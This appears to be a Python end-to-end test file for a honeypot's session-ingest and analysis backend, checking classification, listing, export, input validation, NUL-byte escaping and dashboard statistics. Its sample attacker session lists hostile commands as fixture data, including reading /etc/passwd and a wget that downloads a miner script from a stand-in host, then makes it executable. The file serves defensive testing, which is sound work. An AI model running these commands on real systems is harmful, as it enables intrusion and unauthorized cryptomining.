"""End-to-end test of the honeypot -> backend analysis pipeline.

This whole path was broken: the NLP engine raised on every call, so no session
submitted by the engine was ever stored.
"""

import os

from app.models import UserRole

INGEST_HEADERS = {"X-Honeypot-Token": os.environ["HONEYPOT_INGEST_TOKEN"]}

SAMPLE_SESSION = {
    "protocol": "ssh",
    "attacker_ip": "203.0.113.42",
    "attacker_port": 51234,
    "started_at": "2026-01-15T10:30:00Z",
    "status": "completed",
    "duration_seconds": 412.5,
    "commands": [
        "uname -a",
        "cat /etc/passwd",
        "wget http://198.51.100.9/miner.sh -O /tmp/m.sh",
        "chmod 755 /tmp/m.sh",
        "crontab -l",
    ],
    "payload": "",
    "uploads": [{"filename": "m.sh", "sha256": "a" * 64, "size": 1024}],
    "failed_logins": 12,
    "packets": [{"type": "data", "size": 400}] * 20,
}


async def _create_node(client, auth_headers):
    headers = await auth_headers(UserRole.ADMIN)
    response = await client.post(
        "/api/v1/nodes/",
        headers=headers,
        json={
            "name": "edge-ssh",
            "protocol": "ssh",
            "ip_address": "10.0.0.9",
            "port": 2222,
        },
    )
    assert response.status_code == 201, response.text
    return response.json()["id"], headers


class TestIngest:
    async def test_full_session_ingest(self, client, auth_headers):
        node_id, headers = await _create_node(client, auth_headers)

        response = await client.post(
            f"/api/v1/sessions/ingest-internal?node_id={node_id}",
            json=SAMPLE_SESSION,
            headers=INGEST_HEADERS,
        )
        assert response.status_code == 200, response.text
        body = response.json()

        assert body["session_id"]
        assert body["ai_classification"]["category"] in (
            "benign",
            "reconnaissance",
            "exploitation",
            "exfiltration",
        )
        # Detected from the commands by the NLP engine.
        assert "enum_linux" in body["nlp_analysis"]["tool_names"]
        assert body["iocs"]

    async def test_ingested_session_is_listable(self, client, auth_headers):
        node_id, headers = await _create_node(client, auth_headers)
        await client.post(
            f"/api/v1/sessions/ingest-internal?node_id={node_id}",
            json=SAMPLE_SESSION,
            headers=INGEST_HEADERS,
        )

        # Serialising a session with mapped ATT&CK techniques used to fail
        # response validation, because the schema declared List[str] while the
        # pipeline stores technique objects.
        listing = await client.get("/api/v1/sessions/", headers=headers)
        assert listing.status_code == 200, listing.text
        data = listing.json()
        assert data["total"] == 1

        session = data["sessions"][0]
        assert session["attacker_ip"] == "203.0.113.42"
        for technique in session["mitre_techniques"]:
            assert set(technique) >= {"id", "name"}

    async def test_protocol_is_preserved_through_export(
        self, client, auth_headers
    ):
        """Exports hardcoded protocol="ssh" because it was never stored."""
        node_id, headers = await _create_node(client, auth_headers)
        payload = {**SAMPLE_SESSION, "protocol": "ftp"}
        await client.post(
            f"/api/v1/sessions/ingest-internal?node_id={node_id}",
            json=payload,
            headers=INGEST_HEADERS,
        )

        export = await client.post(
            "/api/v1/export/?format=json", headers=headers
        )
        assert export.status_code == 200
        assert export.json()[0]["session"]["protocol"] == "ftp"

    async def test_malformed_input_is_rejected_not_500(
        self, client, auth_headers
    ):
        node_id, _ = await _create_node(client, auth_headers)
        response = await client.post(
            f"/api/v1/sessions/ingest-internal?node_id={node_id}",
            json={
                **SAMPLE_SESSION,
                "status": "banana",
                "started_at": "not-a-date",
            },
            headers=INGEST_HEADERS,
        )
        # Unknown enum values fall back to defaults instead of raising.
        assert response.status_code == 200, response.text

    async def test_nul_bytes_in_a_capture_are_escaped(self, client, auth_headers):
        # A browser speaking TLS to the plain-HTTP decoy: the engine records
        # the ClientHello as text, NULs included, and Postgres refused it.
        hello = "\x16\x03\x01\x07 \x01\x00\x07\x05\x03\x03"
        node_id, headers = await _create_node(client, auth_headers)
        response = await client.post(
            f"/api/v1/sessions/ingest-internal?node_id={node_id}",
            json={
                **SAMPLE_SESSION,
                "protocol": "http",
                "attacker_ip": "203.0.113.60",
                "commands": [hello],
                "transcript": [{"command": hello, "output": "HTTP/1.1 400 Bad Request"}],
                "uploads": [],
            },
            headers=INGEST_HEADERS,
        )
        assert response.status_code == 200, response.text

        listed = await client.get("/api/v1/sessions/", headers=headers)
        row = next(r for r in listed.json()["sessions"] if r["attacker_ip"] == "203.0.113.60")
        assert "\x00" not in row["command_summary"]
        assert "\\x00" in row["command_summary"]
        transcript = await client.get(
            f"/api/v1/sessions/{row['id']}/transcript", headers=headers
        )
        assert transcript.status_code == 200, transcript.text
        # JSON would carry a NUL as \u0000.
        assert "\\u0000" not in transcript.text

    async def test_unknown_node_is_404(self, client):
        response = await client.post(
            "/api/v1/sessions/ingest-internal?node_id=9999",
            json=SAMPLE_SESSION,
            headers=INGEST_HEADERS,
        )
        assert response.status_code == 404


class TestDashboard:
    async def test_stats_after_ingest(self, client, auth_headers):
        node_id, headers = await _create_node(client, auth_headers)
        await client.post(
            f"/api/v1/sessions/ingest-internal?node_id={node_id}",
            json=SAMPLE_SESSION,
            headers=INGEST_HEADERS,
        )

        response = await client.get("/api/v1/dashboard/stats", headers=headers)
        assert response.status_code == 200, response.text
        stats = response.json()
        assert stats["total_sessions"] == 1
        assert stats["active_honeypots"] == 1
        assert stats["unique_threat_origins"] == 1

    async def test_live_events(self, client, auth_headers):
        node_id, headers = await _create_node(client, auth_headers)
        await client.post(
            f"/api/v1/sessions/ingest-internal?node_id={node_id}",
            json=SAMPLE_SESSION,
            headers=INGEST_HEADERS,
        )
        response = await client.get(
            "/api/v1/dashboard/live-events", headers=headers
        )
        assert response.status_code == 200
        events = response.json()
        assert events and events[0]["attacker_ip"] == "203.0.113.42"
